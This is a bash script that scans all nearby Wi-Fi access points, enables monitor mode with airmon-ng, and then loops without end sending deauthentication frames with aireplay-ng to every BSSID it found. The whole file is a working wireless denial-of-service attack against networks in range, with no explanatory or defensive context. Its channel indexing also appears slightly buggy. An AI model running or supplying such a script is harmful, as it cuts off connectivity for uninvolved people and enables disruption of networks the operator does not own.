#!/bin/bash
echo "Starting..."
file="list"
channels="channels"
all="all"

if [ -f "$all" ]
then
	LIST=$(<$file)
	mapfile -t CHANNELS < $channels #CHANNELS=$(<$channels)
else
	ALL=$(iw dev wlan0 scan)
	echo "$ALL" > "$all"
	LIST=$(cat $all | egrep BSS | egrep -o [a-f:0-9]{17})
	CHANNELS=$(cat $all | grep 'primary channel' | cut -d' ' -f5)
	echo "$LIST" > "$file"
	echo "$CHANNELS" > "$channels"
fi

airmon-ng check kill
airmon-ng start wlan0

while true; do
	i=0
	for bss in $LIST
		do
			iwconfig wlan0mon channel ${CHANNELS[${i}]}
			((i++))
			echo "${CHANNELS[${i}]}"
			aireplay-ng wlan0mon --deauth 3 -a $bss --ignore-negative-one
			#((i+=1))
			echo "$i"
		done
done
